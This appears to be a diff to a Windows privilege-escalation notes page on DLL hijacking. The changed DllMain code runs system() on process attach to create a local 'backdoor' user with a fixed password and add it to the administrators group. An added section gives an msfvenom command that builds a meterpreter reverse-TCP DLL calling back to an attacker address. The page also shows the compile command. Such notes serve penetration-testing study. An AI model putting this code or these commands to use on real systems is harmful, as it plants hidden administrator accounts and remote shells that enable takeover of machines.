@@ -53,8 +53,8 @@ LPVOID lpReserved ) // Reserved
     {
         case DLL_PROCESS_ATTACH: // A process is loading the DLL.
         int i;
-  	    i = system ("net user eviladmin password123! /add");
-  	    i = system ("net localgroup administrators eviladmin /add");
+  	    i = system ("net user backdoor password123! /add");
+  	    i = system ("net localgroup administrators backdoor /add");
         break;
         case DLL_THREAD_ATTACH: // A process is creating a new thread.
         break;
@@ -79,3 +79,13 @@ x86_64-w64-mingw32-gcc malicous-dll.c --shared -o myDll.dll
 
 <pre><code><strong>PS> $env:path
 </strong></code></pre>
+
+
+
+### Create malicious DLL MsfVenom
+
+Instead of adding a user, we may want to add a reverse shell instead.
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil-meterpreter64.dll
+```
